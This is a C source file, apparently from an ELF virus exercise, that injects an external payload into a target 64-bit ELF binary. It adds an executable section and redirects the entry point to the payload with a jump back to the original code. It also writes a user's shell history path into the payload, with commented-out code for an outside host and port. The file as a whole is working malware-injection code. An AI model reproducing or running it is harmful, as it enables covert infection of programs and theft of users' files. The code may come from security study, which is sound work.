#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <arpa/inet.h>
#include <netinet/ip.h> 
#include <netdb.h>
#include <netinet/in.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#ifndef __APPLE__
#include <elf.h>
#endif

#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

#define FM_PAYLOAD_PORTOFF		(1024 + 8 + 4 + 2)
#define FM_PAYLOAD_IPADDROFF	(1024 + 8 + 4)
#define FM_PAYLOAD_PATHOFF		(1024) // sizeof(struct sockaddr_in) + sizeof(path)
#define FM_PAYLOAD_RTNOFF		(1184 + 4) // FM_PAYLOAD_PATHOFF + sizeof(struct stat) + sizeof(int32_t)

// int CDECL_NORM(payload)(void);

int main(int ac, char **av) {
	// struct hostent *hostent = gethostbyname("famine.maxencegama.dev");
	// if (hostent == NULL) {
	// 	if (errno == 1)
	// 		printf("Host not found\n");
	// 	else
	// 		perror("gethostbyname");
	// 	return (1);
	// }

	// uint16_t port = htons(4242);
	// uint32_t addr_ip = *(uint32_t *)hostent->h_addr_list[0];
	// printf("port: %#x %#x (%s)\n", port, addr_ip, inet_ntoa(*(struct in_addr *)&addr_ip));

	// errno = CDECL_NORM(payload)();
	// errno = -errno;
	// perror("payload");

	int fd = open(av[1], O_RDWR);
	if (fd == -1) {
	    perror("open");
	    exit(EXIT_FAILURE);
	}

	struct stat st;
	if (fstat(fd, &st) == -1) {
	    perror("fstat");
	    close(fd);
	    exit(EXIT_FAILURE);
	}

	size_t filesize = st.st_size;
	size_t new_filesize = filesize + payload_size_p + sizeof(Elf64_Shdr);
	printf("filesize: %ld\n", filesize);
	if (ftruncate(fd, new_filesize) == -1) {
	    perror("ftruncate");
	    close(fd);
	    exit(EXIT_FAILURE);
	}

	uint8_t *map = mmap(NULL, new_filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	printf("map: %p\n", map);
	if (map == MAP_FAILED) {
	    perror("mmap");
	    close(fd);
	    exit(EXIT_FAILURE);
	}

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
	Elf64_Phdr *phdrs = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
	Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);

	printf("ehdr: %p\n", ehdr);
	printf("phdrs: %p\n", phdrs);
	printf("shdrs: %p\n", shdrs);

	// Find the last loadable segment
	Elf64_Phdr *last_loadable_phdr = NULL;
	for (int i = 0; i < ehdr->e_phnum; ++i) {
	    if (phdrs[i].p_type == PT_LOAD) {
	        last_loadable_phdr = &phdrs[i];
	    }
	}

	printf("last_loadable_phdr: %p\n", last_loadable_phdr);

	if (!last_loadable_phdr) {
	    fprintf(stderr, "No loadable segment found\n");
	    munmap(map, new_filesize);
	    close(fd);
	    exit(EXIT_FAILURE);
	}

	// Find the last section in the last loadable segment
	Elf64_Shdr *last_section_in_segment = NULL;
	int last_section_in_segment_index = 0;
	for (int i = 0; i < ehdr->e_shnum; ++i) {
	    if (shdrs[i].sh_addr >= last_loadable_phdr->p_vaddr &&
	        shdrs[i].sh_addr < last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz) {
	        last_section_in_segment = &shdrs[i];
			last_section_in_segment_index = i;
	    }
	}

	printf("last_section_in_segment: %p\n", last_section_in_segment);
	printf("last_section_in_segment_index: %d\n", last_section_in_segment_index);

	last_section_in_segment_index += 1;

	if (!last_section_in_segment_index) {
		fprintf(stderr, "No section found in the last loadable segment\n");
		munmap(map, new_filesize);
		close(fd);
		exit(EXIT_FAILURE);
	}

	// Calculate new section header and data offsets
	// Elf64_Off new_section_offset = (last_section_in_segment + 1)->sh_offset;
	Elf64_Off new_section_offset = last_section_in_segment->sh_offset + last_section_in_segment->sh_size;
	Elf64_Addr new_section_addr = last_section_in_segment->sh_addr + last_section_in_segment->sh_size;

	if (new_section_addr % 16 != 0)
	{
		Elf64_Addr add = 16 - (new_section_addr % 16);
		new_section_addr += add;
		last_loadable_phdr->p_memsz += add;
	}

	if (new_section_offset % 16 != 0)
	{
		Elf64_Off add = 16 - (new_section_offset % 16);
		new_section_offset += add;
		last_loadable_phdr->p_filesz += add;
	}

	printf("new_section_offset: %#lx\n", new_section_offset);
	printf("new_section_addr: %#lx\n", new_section_addr);

	// leave space for the new section data and copy the payload
	memmove(map + new_section_offset + payload_size_p, map + new_section_offset, filesize - new_section_offset);

	// Update the last loadable segment sizes
	last_loadable_phdr->p_filesz += payload_size_p;
	last_loadable_phdr->p_memsz += payload_size_p;

	// Copy the payload data
	printf("payload_size_p: %#lx => %#lx\n", new_section_offset, new_section_offset + payload_size_p);
	memcpy(map + new_section_offset, payload_p, payload_size_p);

	printf("new section data addr: %#lx\nnext addr available: %#lx\n", new_section_offset, new_section_offset + payload_size_p);

	/**
	 * 
	 */

	ehdr->e_shoff += payload_size_p;

	last_loadable_phdr->p_flags |= PF_R | PF_X;

	if (msync(map, new_filesize, MS_SYNC) == -1) {
		perror("msync");
	}

	shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);

	// Update section headers
	printf("last_section_in_segment_index: %d %d\n", last_section_in_segment_index, ehdr->e_shnum);

	printf("shdrs %#lx, dest %#lx, src %#lx\n", shdrs, shdrs + last_section_in_segment_index + 1, shdrs + last_section_in_segment_index);
	memmove(shdrs + last_section_in_segment_index + 1, shdrs + last_section_in_segment_index, (ehdr->e_shnum - last_section_in_segment_index) * sizeof(Elf64_Shdr));
	// memset(shdrs + last_section_in_segment_index, 0, sizeof(Elf64_Shdr));
	ehdr->e_shnum += 1;
	
	if (msync(map, new_filesize, MS_SYNC) == -1) {
		perror("msync");
	}

	shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);

	for (int i = last_section_in_segment_index; i < ehdr->e_shnum; ++i) {
		printf("==========================\n");
		printf("old shdrs[%d].sh_offset: %#lx\n", i, shdrs[i].sh_offset);
		shdrs[i].sh_offset += payload_size_p;
		if (shdrs[i].sh_addr != 0) {
			shdrs[i].sh_addr += payload_size_p;
		}
		printf("shdrs[%d].sh_offset: %#lx\n", i, shdrs[i].sh_offset);
		printf("shdrs[%d].sh_addr: %#lx\n", i, shdrs[i].sh_addr);
	}

	// Create new section header
	Elf64_Shdr new_shdr = {
		.sh_name = 5,
		.sh_type = SHT_PROGBITS,
		.sh_flags = SHF_ALLOC | SHF_EXECINSTR,
		.sh_addr = new_section_addr,
		.sh_offset = new_section_offset,
		.sh_size = payload_size_p,
		.sh_link = 0,
		.sh_info = 0,
		.sh_addralign = 16,
		.sh_entsize = 0
	};

	memcpy(shdrs + last_section_in_segment_index, &new_shdr, sizeof(Elf64_Shdr));

	// Update section header string table index
	ehdr->e_shstrndx += 1;

	for (int i = 0; i < ehdr->e_shnum; ++i) {
		if (shdrs[i].sh_type == SHT_SYMTAB) {
			shdrs[i].sh_link += 1;
			break;
		}
	}

	if (msync(map, new_filesize, MS_SYNC) == -1) {
		perror("msync");
	}

	/**
	 * 
	 */

	// memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_IPADDROFF, &addr_ip, sizeof(uint32_t));
	// memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
	const char targetfile[] = "/home/maxence/.zsh_history";
	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PATHOFF, targetfile, sizeof(targetfile));

	/**
	 * 
	 */

	// Update the entry point
	Elf64_Addr last_entry_point = ehdr->e_entry;
	ehdr->e_entry = new_section_addr;
	
	printf("\nlast entry: %d\n", last_entry_point);
	printf("new entry: %d\n", new_section_addr);
	// // Calculate the relative jump offset to the old entry point
	uint64_t jmp_instruction_address = new_section_addr + payload_size_p - FM_PAYLOAD_RTNOFF;
	printf("jmp_instruction_address: %d\n", jmp_instruction_address);
	uint64_t next_instruction_address = jmp_instruction_address + 4; // + 4 bytes to go to the address of the instruction after jump
	printf("next_instruction_address: %d\n", next_instruction_address);
	int32_t offset = (int32_t)(last_entry_point - next_instruction_address);
	printf("offset: %d\n", offset);
	printf("jump to (op + off): %d\n", next_instruction_address + offset);
	printf("jump to (last + off): %d\n", last_entry_point - offset);

	// // Write the relative jump instruction at the end of the payload
	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_RTNOFF, &offset, sizeof(offset));

	if (msync(map, new_filesize, MS_SYNC) == -1) {
		perror("msync");
	}

	/**
	 * INFO:
	 * update _start symbol
	 * to debug the payload will be removed later
	 */

	// Find the _start symbol
	Elf64_Shdr *symtab_shdr = NULL;
	Elf64_Shdr *strtab_shdr = NULL;
	for (int i = 0; i < ehdr->e_shnum; ++i) {
		if (shdrs[i].sh_type == SHT_SYMTAB) {
			symtab_shdr = &shdrs[i];
		}
		if (shdrs[i].sh_type == SHT_STRTAB && i != ehdr->e_shstrndx) {
			strtab_shdr = &shdrs[i];
		}
	}

	if (!symtab_shdr || !strtab_shdr) {
		fprintf(stderr, "Symbol table or string table not found\n");
		munmap(map, new_filesize);
		close(fd);
		exit(EXIT_FAILURE);
	}

	Elf64_Sym *symtab = (Elf64_Sym *)(map + symtab_shdr->sh_offset);
	char *strtab = (char *)(map + strtab_shdr->sh_offset);

	// Find or add the _start symbol
	int symtab_count = symtab_shdr->sh_size / sizeof(Elf64_Sym);
	Elf64_Sym *start_sym = NULL;
	for (int i = 0; i < symtab_count; ++i) {
		if (strcmp(strtab + symtab[i].st_name, "_start") == 0) {
			start_sym = &symtab[i];
			break;
		}
	}

	if (start_sym) {
		printf("start_sym: %p\n", start_sym);
		// Update the existing _start symbol
		start_sym->st_value = new_section_addr;
		start_sym->st_size = payload_size_p;
		start_sym->st_shndx = last_section_in_segment_index;
	} else
		printf("start_sym: NULL\n");

	if (msync(map, new_filesize, MS_SYNC) == -1) {
		perror("msync");
	}

	/**
	 * end of debug
	 */

	// Cleanup
	if (munmap(map, new_filesize) == -1) {
	    perror("munmap");
	}

	close(fd);

	return 0;
}
